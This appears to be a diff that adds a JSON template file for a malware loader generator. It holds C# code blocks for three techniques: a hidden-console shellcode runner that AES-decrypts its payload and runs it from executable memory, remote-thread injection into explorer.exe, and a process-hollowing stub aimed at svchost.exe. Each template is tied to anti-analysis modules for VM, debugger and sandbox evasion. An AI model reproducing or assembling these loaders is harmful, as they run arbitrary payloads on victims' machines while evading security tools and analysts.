@@ -1,0 +1,145 @@
+{
+  "ShellcodeRunner": {
+    "inherits": {
+      "directives": ["base"],
+      "constants": ["window_management", "memory_protection"],
+      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "user32"],
+      "structures": ["input_structures"],
+      "functions": ["aes_decrypt"],
+      "anti_analysis": ["ping_delay", "memory_bombing", "vm_detection"]
+    },
+    "code_blocks": {
+      "main": [
+        "IntPtr hWnd = GetConsoleWindow();",
+        "if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);",
+        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
+        "string keyB64 = \"AES_KEY_B64\";",
+        "string ivB64 = \"AES_IV_B64\";",
+        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
+        "byte[] key = Convert.FromBase64String(keyB64);",
+        "byte[] iv = Convert.FromBase64String(ivB64);",
+        "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
+        "if (shellcode == null) { return; }"
+      ],
+      "memory_allocation": [
+        "IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);",
+        "if (mem == IntPtr.Zero) { return; }"
+      ],
+      "copy_shellcode": [
+        "Marshal.Copy(shellcode, 0, mem, shellcode.Length);"
+      ],
+      "execute_shellcode": [
+        "IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);",
+        "if (hThread == IntPtr.Zero) { return; }"
+      ],
+      "wait_execution": [
+        "WaitForSingleObject(hThread, 0xFFFFFFFF);"
+      ]
+    }
+  },
+  
+  "ProcessInjection": {
+    "inherits": {
+      "directives": ["base", "io"],
+      "constants": ["window_management", "memory_protection", "process_access"],
+      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "kernel32_process"],
+      "functions": ["aes_decrypt"],
+      "anti_analysis": ["ping_delay", "memory_bombing", "timing_check"]
+    },
+    "code_blocks": {
+      "main": [
+        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
+        "string keyB64 = \"AES_KEY_B64\";",
+        "string ivB64 = \"AES_IV_B64\";",
+        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
+        "byte[] key = Convert.FromBase64String(keyB64);",
+        "byte[] iv = Convert.FromBase64String(ivB64);",
+        "byte[] buf = AESDecrypt(encryptedShellcode, key, iv);",
+        "if (buf == null) { return; }"
+      ],
+      "get_process": [
+        "string processName = \"explorer\";",
+        "Process[] processes = Process.GetProcessesByName(processName);",
+        "if (processes.Length == 0) { Console.WriteLine($\"[!] Process {processName} not found.\"); return; }",
+        "uint processId = (uint)processes[0].Id;"
+      ],
+      "open_process": [
+        "IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);",
+        "if (hProcess == IntPtr.Zero)",
+        "{",
+        "    Console.WriteLine(\"[!] Failed to open process.\");",
+        "    return;",
+        "}",
+        "Console.WriteLine($\"[+] Opened process with ID: {processId}\");"
+      ],
+      "memory_allocation": [
+        "Console.WriteLine($\"[*] Allocating {buf.Length} bytes in remote process...\");",
+        "IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);",
+        "if (allocMem == IntPtr.Zero)",
+        "{",
+        "    Console.WriteLine(\"[!] Memory allocation failed.\");",
+        "    return;",
+        "}",
+        "Console.WriteLine($\"[+] Allocated memory at: 0x{allocMem.ToInt64():X}\");"
+      ],
+      "write_memory": [
+        "IntPtr bytesWritten;",
+        "bool writeMem = WriteProcessMemory(hProcess, allocMem, buf, (uint)buf.Length, out bytesWritten);",
+        "if (!writeMem)",
+        "{",
+        "    Console.WriteLine(\"[!] WriteProcessMemory failed.\");",
+        "    return;",
+        "}",
+        "Console.WriteLine(\"[+] Shellcode written!\");"
+      ],
+      "execute_shellcode": [
+        "Console.WriteLine(\"[*] Creating remote thread...\");",
+        "IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);",
+        "if (hThread == IntPtr.Zero)",
+        "{",
+        "    Console.WriteLine(\"[!] CreateRemoteThread failed.\");",
+        "    return;",
+        "}",
+        "Console.WriteLine($\"[+] Remote thread created at: 0x{hThread.ToInt64():X}\");",
+        "Console.WriteLine(\"[*] Injection complete.\");",
+        "Console.ReadLine();"
+      ]
+    }
+  },
+
+  "ProcessHollowing": {
+    "inherits": {
+      "directives": ["base", "io"],
+      "constants": ["window_management", "memory_protection", "process_access"],
+      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "kernel32_process", "ntdll"],
+      "functions": ["aes_decrypt"],
+      "anti_analysis": ["debugger_detection", "vm_detection"]
+    },
+    "code_blocks": {
+      "main": [
+        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
+        "string keyB64 = \"AES_KEY_B64\";",
+        "string ivB64 = \"AES_IV_B64\";",
+        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
+        "byte[] key = Convert.FromBase64String(keyB64);",
+        "byte[] iv = Convert.FromBase64String(ivB64);",
+        "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
+        "if (shellcode == null) { return; }"
+      ],
+      "create_process": [
+        "STARTUPINFO si = new STARTUPINFO();",
+        "PROCESS_INFORMATION pi = new PROCESS_INFORMATION();",
+        "bool success = CreateProcess(null, \"C:\\\\Windows\\\\System32\\\\svchost.exe\", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);"
+      ],
+      "hollow_and_inject": [
+        "// Process hollowing implementation would go here",
+        "// This is a simplified placeholder - full implementation requires:",
+        "// 1. NtUnmapViewOfSection to unmap original image",
+        "// 2. VirtualAllocEx to allocate new memory",
+        "// 3. WriteProcessMemory to write shellcode",
+        "// 4. SetThreadContext to redirect execution",
+        "// 5. ResumeThread to start execution"
+      ]
+    }
+  }
+}
